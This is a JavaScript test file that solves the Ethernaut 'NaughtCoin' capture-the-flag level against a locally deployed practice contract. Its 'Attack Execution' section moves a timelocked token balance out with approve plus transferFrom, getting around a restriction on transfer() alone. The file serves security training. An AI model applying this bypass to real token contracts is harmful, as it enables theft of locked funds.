const NaughtCoinFactory = artifacts.require('./levels/NaughtCoinFactory.sol')
const NaughtCoin = artifacts.require('./levels/NaughtCoin.sol')
const utils = require('../utils/TestUtils')
const { expect } = require("chai")
const chai = require("chai")
const { solidity } = require("ethereum-waffle")
chai.use(solidity)


describe.only("Challenge 15 - NaughtCoin", function () {
    let ethernaut
    let level
    let instance
    let attacker
    let attackerAltAddress

    const initialSupply = "1000000"

    async function createLevelInstance() {
        const [_attacker, _alt] = await web3.eth.getAccounts()
        attacker = _attacker
        attackerAltAddress = _alt

        ethernaut = await utils.getEthernautWithStatsProxy()
        level = await NaughtCoinFactory.new()

        await ethernaut.registerLevel(level.address)

        instance = await utils.createLevelInstance(
            ethernaut,
            level.address,
            attacker,
            NaughtCoin,
        )
    }

    before(createLevelInstance)

    describe("Initial State", function () {
        it("player has all coins", async function () {
            const attackerBalance = await instance.balanceOf(attacker)
            const attackerAltBalance = await instance.balanceOf(attackerAltAddress)

            expect(web3.utils.fromWei(attackerBalance)).to.eq(initialSupply)
            expect(web3.utils.fromWei(attackerAltBalance)).to.eq("0")
        })
    })

    describe("Attack Execution", function () {
        /*
            The NaughtCoin contract only has a small amount of code in it.
            There is a much bigger piece of code "hidden" in ERC20 contract,
            from which the NaughtCoin contract is inheriting a lot of functionality.
            Since the modifier is restricting the transfer() usage, we will
            use approve together with transferFrom to pass this level.
        */
        it("unlock the coins", async function () {
            await instance.approve(attackerAltAddress, web3.utils.toWei(initialSupply))

            await instance.transferFrom(
                attacker,
                attackerAltAddress,
                web3.utils.toWei(initialSupply),
                { from: attackerAltAddress })

            const attackerBalance = await instance.balanceOf(attacker)
            const attackerAltBalance = await instance.balanceOf(attackerAltAddress)

            expect(web3.utils.fromWei(attackerBalance)).to.eq("0")
            expect(web3.utils.fromWei(attackerAltBalance)).to.eq(initialSupply)
        })
    })

    describe("Ethernaut Validation", function () {
        it("level successfully validated by Ethernaut", async function () {
            const result = await utils.submitLevelInstance(
                ethernaut,
                level.address,
                instance.address,
                attacker
            )

            expect(result).to.be.true
        })
    })
})